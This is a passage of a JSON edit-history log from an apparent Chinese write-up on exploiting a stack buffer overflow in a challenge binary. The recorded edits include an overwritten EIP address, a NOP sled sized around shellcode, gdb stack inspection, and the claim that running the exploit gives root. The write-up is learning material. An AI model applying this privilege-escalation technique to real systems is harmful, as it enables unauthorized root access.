hale",[[-1,3618,"s"]],[3619,3619],[3618,3618]]],[1578302983324,["whale@Whale",[[1,3618,"随便找一个内容s"]],[3618,3618],[3626,3626]]],[1578302983836,["whale@Whale",[[-1,3625,"s"]],[3626,3626],[3625,3625]]],[1578302984060,["whale@Whale",[[1,3625,"s"]],[3625,3625],[3626,3626]]],[1578302984652,["whale@Whale",[[-1,3625,"s"]],[3626,3626],[3625,3625]]],[1578302985797,["whale@Whale",[[1,3625,"是、"]],[3625,3625],[3627,3627]]],[1578302986712,["whale@Whale",[[-1,3626,"、"]],[3627,3627],[3626,3626]]],[1578302989434,["whale@Whale",[[1,3626,"\\x90的"]],[3626,3626],[3631,3631]]],[1578303001746,["whale@Whale",[[1,3644,"eip = pack('<L', 0xbffff820) "]],[3644,3644],[3673,3673]]],[1578303004465,["whale@Whale",[[1,3644,"xiu"]],[3644,3644],[3647,3647]]],[1578303005145,["whale@Whale",[[-1,3644,"xiu"]],[3647,3647],[3644,3644]]],[1578303007227,["whale@Whale",[[1,3644,"修改xpe"]],[3644,3644],[3649,3649]]],[1578303007553,["whale@Whale",[[1,3649,"\n"]],[3649,3649],[3650,3650]]],[1578303007748,["whale@Whale",[[1,3650,"\n"]],[3650,3650],[3651,3651]]],[1578303014564,["whale@Whale",[[-1,3675,"82"],[1,3677,"7c"]],[3668,3678],[3678,3678]]],[1578303019409,["whale@Whale",[[1,3681,"\n"]],[3680,3680],[3681,3681]]],[1578303019450,["whale@Whale",[[1,3681,"'"]],[3681,3681],[3682,3682]]],[1578303020807,["whale@Whale",[[-1,3681,"'"]],[3682,3682],[3681,3681]]],[1578303142597,[null,[[1,3646,"e"],[-1,3648,"e"]],[3646,3646],[3648,3648]]],[1578303142597,[null,[[-1,3646,"e"],[1,3649,"e"]],[3648,3648],[3646,3646]]],[1578303115787,["whale@Whale",[[1,3721,"![8]($res/8.PNG)\n\n"]],[3720,3720],[3738,3738]]],[1578303129833,["whale@Whale",[[-1,3740,"0xbffff790\n\n\ngdb /usr/local/bin/chal"]],[3740,3776],[3740,3740]]],[1578303202570,[null,[[1,3646,"e"],[-1,3648,"e"]],[3646,3646],[3648,3648]]],[1578303202570,[null,[[-1,3646,"e"],[1,3649,"e"]],[3648,3648],[3646,3646]]],[1578303174066,["whale@Whale",[[-1,2828,"写一个exp demo"]],[2828,2839],[2828,2828]]],[1578303178584,["whale@Whale",[[-1,2828,"\n"]],[2828,2828],[2827,2827]]],[1578303185412,["whale@Whale",[[1,2596,"\n"]],[2596,2596],[2597,2597]]],[1578303186439,["whale@Whale",[[1,2621,"\n"]],[2621,2621],[2622,2622]]],[1578303187239,["whale@Whale",[[1,2655,"\n"]],[2655,2655],[2656,2656]]],[1578303262597,[null,[[1,3637,"e"],[-1,3639,"e"]],[3637,3637],[3639,3639]]],[1578303262597,[null,[[-1,3637,"e"],[1,3640,"e"]],[3639,3639],[3637,3637]]],[1578303206440,["whale@Whale",[[1,2769,"\n"]],[2769,2769],[2770,2770]]],[1578303254391,["whale@Whale",[[1,2654,"    #zh"]],[2654,2654],[2661,2661]]],[1578303254920,["whale@Whale",[[-1,2659,"zh"]],[2661,2661],[2659,2659]]],[1578303262492,["whale@Whale",[[1,2659,"这个数字500，"]],[2659,2659],[2667,2667]]],[1578303322630,[null,[[1,3651,"e"],[-1,3653,"e"]],[3651,3651],[3653,3653]]],[1578303322631,[null,[[-1,3651,"e"],[1,3654,"e"]],[3653,3653],[3651,3651]]],[1578303263739,["whale@Whale",[[1,2667,"不能"]],[2667,2667],[2669,2669]]],[1578303265942,["whale@Whale",[[-1,2666,"，不能"]],[2669,2669],[2666,2666]]],[1578303274057,["whale@Whale",[[1,2666,"可以随意设置，但不能小于5"]],[2666,2666],[2679,2679]]],[1578303275136,["whale@Whale",[[-1,2678,"5"]],[2679,2679],[2678,2678]]],[1578303277509,["whale@Whale",[[1,2678,"362,f"]],[2678,2678],[2683,2683]]],[1578303278076,["whale@Whale",[[-1,2681,",f"]],[2683,2683],[2681,2681]]],[1578303291068,["whale@Whale",[[1,2681,"，否则不会造成溢出错误。也"]],[2681,2681],[2694,2694]]],[1578303292743,["whale@Whale",[[-1,2692,"。也"]],[2694,2694],[2692,2692]]],[1578303300975,["whale@Whale",[[1,2692,"；也不能太大，不方便分析。"]],[2692,2692],[2705,2705]]],[1578303317639,["whale@Whale",[[1,2724,"这条命令的意思是，**"]],[2724,2724],[2735,2735]]],[1578303321658,["whale@Whale",[[1,2746,"**"]],[2746,2746],[2748,2748]]],[1578303502648,[null,[[1,3702,"e"],[-1,3704,"e"]],[3702,3702],[3704,3704]]],[1578303502648,[null,[[-1,3702,"e"],[1,3705,"e"]],[3704,3704],[3702,3702]]],[1578303480500,["whale@Whale",[[1,2896,"\n"]],[2894,2894],[2895,2895]]],[1578303480717,["whale@Whale",[[1,2897,"\n"]],[2895,2895],[2896,2896]]],[1578303498782,["whale@Whale",[[1,2896,"这一步的作用是，填充"]],[2896,2896],[2906,2906]]],[1578303499481,["whale@Whale",[[-1,2904,"填充"]],[2906,2906],[2904,2904]]],[1578303562640,[null,[[1,3712,"e"],[-1,3714,"e"]],[3712,3712],[3714,3714]]],[1578303562640,[null,[[-1,3712,"e"],[1,3715,"e"]],[3714,3714],[3712,3712]]],[1578303511668,["whale@Whale",[[1,2904,"写一个demo，方便"]],[2904,2904],[2914,2914]]],[1578303515167,["whale@Whale",[[-1,2907,"demo，方便"]],[2914,2914],[2907,2907]]],[1578303518777,["whale@Whale",[[1,2907,"exp的demo，"]],[2907,2907],[2916,2916]]],[1578303525924,["whale@Whale",[[-1,2915,"，"]],[2916,2916],[2915,2915]]],[1578303539539,["whale@Whale",[[1,2915,"。注意此时的eip是错误的。"]],[2915,2915],[2929,2929]]],[1578303622667,[null,[[1,3737,"e"],[-1,3739,"e"]],[3737,3737],[3739,3739]]],[1578303622667,[null,[[-1,3737,"e"],[1,3740,"e"]],[3739,3739],[3737,3737]]],[1578303576705,["whale@Whale",[[-1,2928,"。"]],[2929,2929],[2928,2928]]],[1578303593172,["whale@Whale",[[1,2928,"，当我们写好demo以后，就可以进行后续调试了。"]],[2928,2928],[2952,2952]]],[1578303612654,["whale@Whale",[[1,2944,"使用python exp.py来"]],[2944,2944],[2960,2960]]],[1578303618191,["whale@Whale",[[1,2946,"·"]],[2946,2946],[2947,2947]]],[1578303619156,["whale@Whale",[[-1,2946,"·"]],[2947,2947],[2946,2946]]],[1578303620005,["whale@Whale",[[1,2946,"`"]],[2946,2946],[2947,2947]]],[1578303622065,["whale@Whale",[[1,2960,"`"]],[2960,2960],[2961,2961]]],[1578303682689,[null,[[1,3778,"e"],[-1,3780,"e"]],[3778,3778],[3780,3780]]],[1578303682689,[null,[[-1,3778,"e"],[1,3781,"e"]],[3780,3780],[3778,3778]]],[1578303654152,["whale@Whale",[[1,3625,"  这条命令的意思是，**查看栈指针寄存器ESP**，500字节的内容，每次输出100字节，按enter键查看下一个100字节内容，分为5次输出"]],[3625,3625],[3697,3697]]],[1578303657683,["whale@Whale",[[-1,3652,"5"]],[3653,3653],[3652,3652]]],[1578303657943,["whale@Whale",[[1,3652,"4"]],[3652,3652],[3653,3653]]],[1578303662275,["whale@Whale",[[-1,3693,"5"]],[3694,3694],[3693,3693]]],[1578303662515,["whale@Whale",[[1,3693,"4"]],[3693,3693],[3694,3694]]],[1578303671023,["whale@Whale",[[-1,3699,"\n"]],[3699,3699],[3698,3698]]],[1578303677872,["whale@Whale",[[-1,3699,"`nop = \"\\x90\" * (buffersize - len(shellcode))  #缓冲区长度减去shellcode的长度，其余部分用\\x90填充`\n"]],[3698,3779],[3698,3698]]],[1578303742657,[null,[[1,3768,"e"],[-1,3770,"e"]],[3768,3768],[3770,3770]]],[1578303742657,[null,[[-1,3768,"e"],[1,3771,"e"]],[3770,3770],[3768,3768]]],[1578303691090,["whale@Whale",[[1,3771,"de"]],[3771,3771],[3773,3773]]],[1578303691729,["whale@Whale",[[-1,3771,"de"]],[3773,3773],[3771,3771]]],[1578303695916,["whale@Whale",[[1,3771,"的这一行{"]],[3771,3771],[3776,3776]]],[1578303696477,["whale@Whale",[[-1,3775,"{"]],[3776,3776],[3775,3775]]],[1578303697177,["whale@Whale",[[1,3775,"："]],[3775,3775],[3776,3776]]],[1578303697924,["whale@Whale",[[-1,3777,"\n"]],[3776,3776],[3776,3776]]],[1578303698572,["whale@Whale",[[-1,3776,"\n"]],[3776,3776],[3776,3776]]],[1578303699772,["whale@Whale",[[1,3776,"·"]],[3776,3776],[3777,3777]]],[1578303700289,["whale@Whale",[[-1,3776,"·"]],[3777,3777],[3776,3776]]],[1578303700790,["whale@Whale",[[1,3776,"`"]],[3776,3776],[3777,3777]]],[1578303701479,["whale@Whale",[[1,3806,"`"]],[3806,3806],[3807,3807]]],[1578303802656,[null,[[1,3768,"e"],[-1,3770,"e"]],[3768,3768],[3770,3770]]],[1578303802656,[null,[[-1,3768,"e"],[1,3771,"e"]],[3770,3770],[3768,3768]]],[1578303776721,["whale@Whale",[[1,3614,"\n"]],[3614,3614],[3615,3615]]],[1578303862662,[null,[[1,3769,"e"],[-1,3771,"e"]],[3769,3769],[3771,3771]]],[1578303862662,[null,[[-1,3769,"e"],[1,3772,"e"]],[3771,3771],[3769,3769]]],[1578303819393,["whale@Whale",[[1,3810,"\n"]],[3810,3810],[3811,3811]]],[1578303828779,["whale@Whale",[[1,3810,"运行exp即可得到root权限："]],[3810,3810],[3826,3826]]],[1578303829859,["whale@Whale",[[-1,3826,"\n"]],[3826,3826],[3826,3826]]],[1578303831202,["whale@Whale",[[1,3826,"·"]],[3826,3826],[3827,3827]]],[1578303831820,["whale@Whale",[[-1,3826,"·"]],[3827,3827],[3826,3826]]],[1578303832330,["whale@Whale",[[1,3826,"`"]],[3826,3826],[3827,3827]]],[1578303832900,["whale@Whale",[[1,3863,"`"]],[3863,3863],[3864,3864]]],[1578303834851,["whale@Whale",[[-1,3866,"\n"]],[3866,3866],[3865,3865]]],[1578303839607,["whale@Whale",[[1,3884,"## zo"]],[3884,3884],[3889,3889]]],[1578303840113,["whale@Whale",[[-1,3887,"zo"]],[3889,3889],[3887,3887]]],[1578303848712,["whale@Whale",[[1,3887,"执行liuc"]],[3887,3887],[3893,3893]]],[1578303850494,["whale@Whale",[[-1,3889,"liuc"]],[3893,3893],[3889,3889]]],[1578303851190,["whale@Whale",[[1,3889,"liu"]],[3889,3889],[3892,3892]]],[1578303852101,["whale@Whale",[[-1,3889,"liu"]],[3892,3892],[3889,3889]]],[1578303853271,["whale@Whale",[[1,3889,"流程"]],[3889,3889],[3891,3891]]],[1578303853534,["whale@Whale",[[1,3895,"\n"]],[3891,3891],[3892,3892]]],[1578304163191,[null,[[1,3769,"e"],[-1,3771,"e"]],[3769,3769],[3771,3771]]],[1578304163191,[null,[[-1,3769,"e"],[1,3772,"e"]],[3771,3771],[3769,3769]]],[1578304105342,["whale@Whale",[[1,3894,"![9]($res/9.png)\n\n"]],[3893,3893],[3911,3911]]],[1578304129074,["whale@Whale",[[-1,3893,"\n"]],[3892,3892],[3892,3892]]],[1578304588166,[null,[[1,3769,"e"],[-1,3771,"e"]],[3769,3769],[3771,3771]]],[1578304588166,[null,[[-1,3769,"e"],[1,3772,"e"]],[3771,3771],[3769,3769]]],[1578304565866,["whale@Whale",[[-1,3893,"![9]($res/9.png)\n"]],[3893,3910],[3893,3893]]],[1578304579931,["whale@Whale",[[1,3894,"![10]($res/10.png)\n\n"]],[3893,3893],[3913,3913]]],[1578304587153,["whale@Whale",[[-1,3893,"\n"]],[3892,3892],[3891,3891]]]]]]}